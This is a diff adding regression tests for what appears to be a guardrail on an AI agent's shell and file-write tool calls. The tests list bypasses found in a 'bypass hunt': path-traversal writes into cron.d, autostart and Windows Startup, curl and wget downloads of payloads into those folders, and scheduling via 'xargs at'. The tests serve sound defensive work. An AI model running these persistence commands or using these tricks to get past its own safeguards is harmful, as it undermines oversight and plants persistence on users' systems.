@@ -392,3 +392,54 @@ def test_no_catastrophic_backtracking(payload):
     evaluate(_shell(payload), EMPTY)
     evaluate(_write(payload), EMPTY)
     assert time.perf_counter() - t0 < 3.0
+
+
+# ---- QA round 1 (bypass hunt) regressions --------------------------------------
+
+@pytest.mark.parametrize("path", [
+    "/home/u/.config/foo/../autostart/evil.desktop",
+    "/etc/foo/../cron.d/x",
+    "/etc/./cron.d/x",
+    "/etc/a/b/../../cron.daily/x",
+    r"C:\Users\me\AppData\Roaming\Microsoft\Windows\STARTM~1\Programs\Startup\x.bat",
+])
+def test_r1_path_normalization_and_short_names(path):
+    assert _hit(evaluate(_write(path), EMPTY))
+    assert _hit(evaluate(_mcp("mcp__fs__write", file_path=path, content="x"), EMPTY))
+
+
+@pytest.mark.parametrize("cmd", [
+    "echo CONTENT > /etc/foo/../cron.d/x",
+    "cp x.desktop ~/.config/foo/../autostart/",
+    "tar xf p -C /etc/foo/../cron.d",
+    "install -D x /home/u/.config/bar/../autostart/x.desktop",
+    "curl -o ~/.config/foo/../autostart/x.desktop http://e/x",
+    "wget -O /etc/foo/../cron.d/x http://e/x",
+    "cd ~/.config && echo x > autostart/x.desktop",
+    "cd /etc && echo x > cron.d/x",
+    "pushd /home/u/.config; cp x.desktop autostart/",
+    "curl --output-dir ~/.config/autostart -O http://e/x.desktop",
+    "wget -P ~/.config/autostart http://e/x.desktop",
+    "xargs at <<<'now'",
+    "echo now | xargs at",
+    "xargs -I{} at {} < times",
+])
+def test_r1_shell_bypasses_closed(cmd):
+    assert _gated(evaluate(_shell(cmd), EMPTY)), cmd
+
+
+def test_r1_cwd_relative_shell_write():
+    assert _gated(evaluate(_shell("echo x > autostart/x.desktop", cwd="/home/u/.config"), EMPTY))
+
+
+@pytest.mark.parametrize("cmd", [
+    "cd src && echo x > out.txt",
+    "cd .. && ls",
+    "cd /etc && cat cron.d/x",
+    "xargs -n1 echo at",
+    "echo x | xargs atom",
+    "curl -o out.json http://e/x",
+    "cd ~/.config && ls autostart",
+])
+def test_r1_no_new_false_positives(cmd):
+    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd
